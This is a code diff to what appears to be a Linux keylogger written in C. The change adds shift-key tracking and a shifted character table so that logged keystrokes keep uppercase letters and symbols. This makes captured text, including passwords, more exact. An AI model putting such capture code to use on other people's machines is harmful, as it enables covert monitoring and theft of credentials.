@@ -111,7 +111,7 @@ static bool has_seq_triggered(unsigned short ev_code,
  * }
  */
 
-static void keylog_log(keylog_t *kl, struct input_event e)
+static void keylog_log(keylog_t *kl, struct input_event e, bool is_upper)
 {
     struct priv *priv = (struct priv *) kl->priv;
 
@@ -119,69 +119,73 @@ static void keylog_log(keylog_t *kl, struct input_event e)
         return;
     }
 
-    char c = '\0';
+    char lc = '\0';
+    char uc = '\0';
+
     unsigned short code = e.code;
 
     switch (code) {
-    case KEY_1: c = '1'; break;
-    case KEY_2: c = '2'; break;
-    case KEY_3: c = '3'; break;
-    case KEY_4: c = '4'; break;
-    case KEY_5: c = '5'; break;
-    case KEY_6: c = '6'; break;
-    case KEY_7: c = '7'; break;
-    case KEY_8: c = '8'; break;
-    case KEY_9: c = '9'; break;
-    case KEY_0: c = '0'; break;
+    case KEY_1: lc = '1'; uc = '!'; break;
+    case KEY_2: lc = '2'; uc = '@'; break;
+    case KEY_3: lc = '3'; uc = '#'; break;
+    case KEY_4: lc = '4'; uc = '$'; break;
+    case KEY_5: lc = '5'; uc = '%'; break;
+    case KEY_6: lc = '6'; uc = '^'; break;
+    case KEY_7: lc = '7'; uc = '&'; break;
+    case KEY_8: lc = '8'; uc = '*'; break;
+    case KEY_9: lc = '9'; uc = '('; break;
+    case KEY_0: lc = '0'; uc = ')'; break;
 
-    case KEY_A: c = 'a'; break;
-    case KEY_B: c = 'b'; break;
-    case KEY_C: c = 'c'; break;
-    case KEY_D: c = 'd'; break;
-    case KEY_E: c = 'e'; break;
-    case KEY_F: c = 'f'; break;
-    case KEY_G: c = 'g'; break;
-    case KEY_H: c = 'h'; break;
-    case KEY_I: c = 'i'; break;
-    case KEY_J: c = 'j'; break;
-    case KEY_K: c = 'k'; break;
-    case KEY_L: c = 'l'; break;
-    case KEY_M: c = 'm'; break;
-    case KEY_N: c = 'n'; break;
-    case KEY_O: c = 'o'; break;
-    case KEY_P: c = 'p'; break;
-    case KEY_Q: c = 'q'; break;
-    case KEY_R: c = 'r'; break;
-    case KEY_S: c = 's'; break;
-    case KEY_T: c = 't'; break;
-    case KEY_U: c = 'u'; break;
-    case KEY_V: c = 'v'; break;
-    case KEY_W: c = 'w'; break;
-    case KEY_X: c = 'x'; break;
-    case KEY_Y: c = 'y'; break;
-    case KEY_Z: c = 'z'; break;
+    case KEY_A: lc = 'a'; uc = 'A'; break;
+    case KEY_B: lc = 'b'; uc = 'B'; break;
+    case KEY_C: lc = 'c'; uc = 'C'; break;
+    case KEY_D: lc = 'd'; uc = 'D'; break;
+    case KEY_E: lc = 'e'; uc = 'E'; break;
+    case KEY_F: lc = 'f'; uc = 'F'; break;
+    case KEY_G: lc = 'g'; uc = 'G'; break;
+    case KEY_H: lc = 'h'; uc = 'H'; break;
+    case KEY_I: lc = 'i'; uc = 'I'; break;
+    case KEY_J: lc = 'j'; uc = 'J'; break;
+    case KEY_K: lc = 'k'; uc = 'K'; break;
+    case KEY_L: lc = 'l'; uc = 'L'; break;
+    case KEY_M: lc = 'm'; uc = 'M'; break;
+    case KEY_N: lc = 'n'; uc = 'N'; break;
+    case KEY_O: lc = 'o'; uc = 'O'; break;
+    case KEY_P: lc = 'p'; uc = 'P'; break;
+    case KEY_Q: lc = 'q'; uc = 'Q'; break;
+    case KEY_R: lc = 'r'; uc = 'R'; break;
+    case KEY_S: lc = 's'; uc = 'S'; break;
+    case KEY_T: lc = 't'; uc = 'T'; break;
+    case KEY_U: lc = 'u'; uc = 'U'; break;
+    case KEY_V: lc = 'v'; uc = 'V'; break;
+    case KEY_W: lc = 'w'; uc = 'W'; break;
+    case KEY_X: lc = 'x'; uc = 'X'; break;
+    case KEY_Y: lc = 'y'; uc = 'Y'; break;
+    case KEY_Z: lc = 'z'; uc = 'Z'; break;
 
-    case KEY_COMMA: c = ','; break;
-    case KEY_SEMICOLON: c = ';'; break;
-    case KEY_APOSTROPHE: c = '\''; break;
-    case KEY_DOT: c = '.'; break;
-    case KEY_SLASH: c = '/'; break;
-    case KEY_BACKSLASH: c = '\\'; break;
+    case KEY_COMMA: lc = ','; uc = '<'; break;
+    case KEY_SEMICOLON: lc = ';'; uc = ':'; break;
+    case KEY_APOSTROPHE: lc = '\''; uc = '"'; break;
+    case KEY_DOT: lc = '.'; uc = '>'; break;
+    case KEY_SLASH: lc = '/'; uc = '?'; break;
+    case KEY_BACKSLASH: lc = '\\'; uc = '|'; break;
 
     case KEY_BACKSPACE:
-        c = priv->log.backspace;
+        lc = uc = priv->log.backspace;
         break;
 
-    case KEY_MINUS: c = '-'; break;
-    case KEY_EQUAL: c = '='; break;
-    case KEY_GRAVE: c = '~'; break;
+    case KEY_MINUS: lc = '-'; uc = '_'; break;
+    case KEY_EQUAL: lc = '='; uc = '+'; break;
+    case KEY_GRAVE: lc = '`'; uc = '~'; break;
 
-    case KEY_ENTER: c = '\n'; break;
-    case KEY_TAB: c = '\t'; break;
-    case KEY_SPACE: c = ' '; break;
+    case KEY_ENTER: lc = uc = '\n'; break;
+    case KEY_TAB: lc = uc = '\t'; break;
+    case KEY_SPACE: lc = uc = ' '; break;
 
-    default: c = '\0'; break;
+    default: lc = uc = '\0'; break;
     }
+
+    char c = (is_upper) ? uc : lc;
 
     write(priv->log.fd, &c, 1);
 }
@@ -189,9 +193,22 @@ static void keylog_log(keylog_t *kl, struct input_event e)
 void keylog_process_event(keylog_t *kl, struct input_event e)
 {
     struct priv *priv = (struct priv *) kl->priv;
+    static bool is_upper;
 
-    if (e.type == EV_KEY && e.value == RELEASED) {
-        keylog_log(kl, e);
+    if (e.type != EV_KEY) {
+        return;
+    }
+
+    if (e.code == KEY_LEFTSHIFT || e.code == KEY_RIGHTSHIFT) {
+        if (e.value == REPEATED || e.value == PRESSED) {
+            is_upper = true;
+        } else {
+            is_upper = false;
+        }
+    }
+
+    if (e.value == RELEASED) {
+        keylog_log(kl, e, is_upper);
 
         for (int k = 0; k < priv->num_seq; k++) {
             if (has_seq_triggered(e.code, &priv->seq_list[k])) {
